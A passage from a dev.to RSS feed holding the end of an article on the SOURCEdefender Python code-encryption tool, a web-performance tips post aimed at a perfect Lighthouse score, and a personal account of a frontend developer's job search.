$ sourcedefender encrypt --remove mycode.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And to import the code you can either set an environment variable (as with the encryption process). You can also set these in your code before the import:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ python3
&amp;gt;&amp;gt;&amp;gt; import sourcedefender
&amp;gt;&amp;gt;&amp;gt; from os import environ
&amp;gt;&amp;gt;&amp;gt; environ["SOURCEDEFENDER_PASSWORD"] = "1234abcd"
&amp;gt;&amp;gt;&amp;gt; environ["SOURCEDEFENDER_SALT"] = "dcba4321"
&amp;gt;&amp;gt;&amp;gt; import mycode
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The password and salt are specific to the next import, so if you want to use different ones for different files, then feel free to encrypt with different values and remember to set the required password/salt before your import.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#impact-on-performance"&gt;
  &lt;/a&gt;
  Impact on Performance
&lt;/h3&gt;

&lt;p&gt;This is a common concern when dealing with tools such as this. However, SOURCEdefender hooks into the standard Python import process so there is no impact on the performance of your running application. The decryption of your code takes place during the import of your module and encrypted code won’t run any slower once loaded from a .pye file compared to running after loading from a .py or .pyc file.&lt;/p&gt;

&lt;p&gt;Links:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.sourcedefender.co.uk/"&gt;https://www.sourcedefender.co.uk/&lt;/a&gt;&lt;br&gt;
&lt;a href="https://pypi.org/project/sourcedefender/"&gt;https://pypi.org/project/sourcedefender/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>python</category>
      <category>security</category>
    </item>
    <item>
      <title>How to make your site more performant</title>
      <author>TheYoungestCoder</author>
      <pubDate>Fri, 25 Jun 2021 19:21:21 +0000</pubDate>
      <link>https://dev.to/theyoungestcoder/how-to-make-your-site-more-performant-3lgm</link>
      <guid>https://dev.to/theyoungestcoder/how-to-make-your-site-more-performant-3lgm</guid>
      <description>&lt;p&gt;Since school ended, it's time for another article! Anyway this is part two of my series "Getting a 100% score in lighthouse" BTW I also updated my previous post in this series.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-avoid-chaining-critical-requests"&gt;
  &lt;/a&gt;
  1. Avoid chaining critical requests
&lt;/h2&gt;

&lt;p&gt;One of my favorite resources as a web developer was the google fonts api. If you've ever used google fonts you'll know that lighthouse always screams at you to "avoid chaining critical requests". This significantly reduces the speed of webfont load because it has to make a request to load the css, then load the actual font. Luckily it's an easy fix, just follow these steps:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Go to the /css2 url in your browser&lt;/li&gt;
&lt;li&gt;Copy the entire response&lt;/li&gt;
&lt;li&gt;Paste into your html inside &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#2-drop-jquery"&gt;
  &lt;/a&gt;
  2. Drop jQuery
&lt;/h2&gt;

&lt;p&gt;When I first used jQuery I instantly fell in love with it's clean syntax and concise API. I know it'll be hard to leave, but most of it's deadweight. Consider using a "mini jQuery" library such as &lt;a href="https://github.com/dciccale/ki.js/"&gt;ki.js&lt;/a&gt;.It may seem challenging at first, but once you get familiar with &lt;code&gt;document.querySelectorAll&lt;/code&gt; and other DOM APIS you'll wonder why you used jQuery in the first place. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-prevent-cumulative-layout-shift"&gt;
  &lt;/a&gt;
  3. Prevent cumulative layout shift
&lt;/h2&gt;

&lt;p&gt;What is cumulative layout shift (CLS for short) you ask? It's basically when the size of some element changes causing another element's position on the page to shift unexpectedly. This is common for images because the browser doesn't know the size of the image before it's downloaded. Including &lt;code&gt;width&lt;/code&gt; and &lt;code&gt;height&lt;/code&gt; attributes will do the trick. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-minify-resources"&gt;
  &lt;/a&gt;
  4. Minify resources
&lt;/h2&gt;

&lt;p&gt;The file size is definitely affects the time the server takes to respond. Minifying is the fix you need to reduce the size of it. If you use netlify to host your site, there is an option in the build settings to automatically minify scripts and stylesheets. If you're a vscode user, you can also install an extension titled "minify". Also, consider using a different file type if it offers better compression. I've found that &lt;code&gt;webp&lt;/code&gt; was waaaaay more storage efficient.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-conclusion"&gt;
  &lt;/a&gt;
  In conclusion
&lt;/h2&gt;

&lt;p&gt;Less requests makes for faster load times which result in a better lighthouse score. Use all these tips to reduce the number of requests and their size. Stay tuned for my next article "How to improve SEO". Thank you for reading!&lt;/p&gt;

</description>
      <category>webdev</category>
    </item>
    <item>
      <title>How tedious can job Search as a frontend developer be?</title>
      <author>hillary</author>
      <pubDate>Fri, 25 Jun 2021 19:16:12 +0000</pubDate>
      <link>https://dev.to/hills2003/how-tedious-can-job-search-as-a-frontend-developer-be-3odi</link>
      <guid>https://dev.to/hills2003/how-tedious-can-job-search-as-a-frontend-developer-be-3odi</guid>
      <description>&lt;p&gt;At one point in our coding career we all feel the need to work on something else other than dummy projects from youtube and todo-apps&lt;/p&gt;

&lt;p&gt;that feeling also comes with the idea to start searching for a frontend developer job with some cool pay&lt;/p&gt;

&lt;p&gt;truth be told the journey of job search is really tedious&lt;/p&gt;

&lt;p&gt;i started of my job search as an 18 year old last two months i had no idea of what i needed in order to land my first job,but honestly speaking i've gat the skills man&lt;/p&gt;

&lt;p&gt;i started out building some basic projects so as to fill up my github repo.&lt;br&gt;
  i built few projects like a todo-app ,weather-app,chat-app, and also a movie-search-app , i also exploited several api's&lt;br&gt;
 after this few things i started applying for jobs and in two weeks no response from any job which i applied for&lt;br&gt;
    offcourse i became frustrated,then i decided to go farther , in previous searches i didnt have a resume neither did i have a portfolio to show my works, so i started working on my portfolio it was not much of a deal thou --&amp;gt; &lt;a href="https://hillaryvictor.netlify.app"&gt;https://hillaryvictor.netlify.app&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;after that i developed a quite cool resume and also decided to have an online presence and i chose Dev.to &lt;br&gt;
  well my job Search continued , a week passed two weeks passed and after few more weeks i began recieving calls from companies, usually your skills will be tested and few times you may be rejected but whats it all about?&lt;/p&gt;

&lt;p&gt;keep striving a single||multiple rejection does not mean you arent worth it&lt;/p&gt;

&lt;p&gt;at the time &lt;br&gt;
of writing this i am currently undergoing a technical interview&lt;/p&gt;

&lt;p&gt;Keep it cool out there guys||girls and keep codding!! &lt;/p&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>react</category>
      <category>html</category>
    </item>
  </channel>
</rss>
